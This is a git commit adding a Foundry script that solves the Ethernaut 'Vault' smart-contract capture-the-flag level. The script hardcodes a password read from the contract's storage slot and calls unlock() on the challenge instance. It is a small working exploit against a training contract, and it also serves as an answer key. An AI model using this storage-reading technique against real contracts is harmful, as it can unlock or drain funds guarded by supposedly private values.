79f4283c798f15c47e79e7a0d3a5df5147f53e81
LouisTsai <q1030176@gmail.com>
2024-01-05 10:16:14 +0800

    feat: complete 08 vault challenge

--- script/solutions/08-Vault.s.sol
+++ script/solutions/08-Vault.s.sol
@@ -5,6 +5,9 @@ import {Script, console2} from "forge-std/Script.sol";
 import {EthernautHelper} from "../setup/EthernautHelper.sol";
 
 // NOTE You can import your helper contracts & create interfaces here
+interface IVault {
+    function unlock(bytes32 _password) external;
+}
 
 contract ForceSolution is Script, EthernautHelper {
     address constant LEVEL_ADDRESS = 0xB7257D8Ba61BD1b3Fb7249DCd9330a023a5F3670;
@@ -15,9 +18,9 @@ contract ForceSolution is Script, EthernautHelper {
         // NOTE this is the address of your challenge contract
         address challengeInstance = createInstance(LEVEL_ADDRESS);
 
-        // YOUR SOLUTION HERE
-
-
+        // fetch using Alchemy Composer -> getStorageAt
+        bytes32 password = 0x412076657279207374726f6e67207365637265742070617373776f7264203a29;
+        IVault(challengeInstance).unlock(password);
 
         // SUBMIT CHALLENGE. (DON'T EDIT)
         bool levelSuccess = submitInstance(challengeInstance);
